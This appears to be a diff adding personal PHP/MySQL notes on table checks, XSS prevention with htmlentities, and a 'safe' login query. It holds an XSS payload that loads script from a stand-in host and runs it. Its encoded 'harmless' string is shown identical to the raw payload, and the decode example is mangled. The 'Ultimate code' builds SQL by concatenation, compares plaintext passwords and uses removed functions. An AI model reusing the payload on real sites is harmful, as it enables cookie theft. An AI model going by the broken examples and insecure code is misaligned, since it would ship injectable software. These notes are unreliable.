@@ -1,0 +1,67 @@
+Other Techniques
+
+Check if a table exists in MySQL currently: 
+
+$checktable = mysqli_query($db_connect, "SHOW TABLES LIKE '".$table."'"); 
+$exists = mysqli_num_rows($checktable) > 0; 
+
+Preventing HTML Injection 
+
+This occurs when you allow HTML, or more often JavaScript code, to be input by a user and then displayed back by your website. One place this is common is in a comment form. What most often happens is that a malicious user will try to write code that steals cookies from your site’s users, allowing him or her to discover username and password pairs or other information. Even worse, the malicious user might launch an attack to download a Trojan onto a user’s computer. 
+
+But preventing this is as simple as calling the htmlentities function, which strips out all HTML markup codes and replaces them with a form that displays the characters, but does not allow a browser to act on them. For example, consider the following HTML: 
+
+<script src='http://x.com/hack.js'> </script><script>hack();</script> 
+
+This code loads in a JavaScript program and then executes malicious functions. But if it is first passed through htmlentities, it will be turned into the following, totally harmless string: 
+
+<script src='http://x.com/hack.js'> 
+</script><script>hack();</script> 
+
+**Stack overflow answer: 
+As many others have said, htmlentities() will do the trick... but it will look like shit. 
+
+Wrap it up with a <pre> tag and you'll preserve your indentation. 
+
+echo '<pre>'; 
+echo htmlspecialchars($YOUR_HTML); 
+echo '</pre>'; 
+
+How to safely access MySQL and prevent XSS attacks (Ulitmate code)
+
+<?php 
+$user = mysql_entities_fix_string($_POST['user']); 
+$pass = mysql_entities_fix_string($_POST['pass']); 
+$query = "SELECT * FROM users WHERE user='$user' AND pass='$pass'"; 
+
+function mysql_entities_fix_string($string) 
+{ 
+return htmlentities(mysql_fix_string($string)); 
+} 
+
+function mysql_fix_string($string) 
+{ 
+if (get_magic_quotes_gpc()) $string = stripslashes($string); 
+return mysql_real_escape_string($string); 
+} 
+?>
+
+Convert the HTML entities back to characters: 
+
+Use the function: string htmlspecialchars_decode ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 ] ) 
+
+Example: 
+
+<?php 
+$str = "<p>this -> "</p>\n"; 
+
+echo htmlspecialchars_decode($str); 
+
+// note that here the quotes aren't converted 
+echo htmlspecialchars_decode($str, ENT_NOQUOTES); 
+?> 
+
+The above example will output: 
+
+<p>this -> "</p> 
+<p>this -> "</p> 
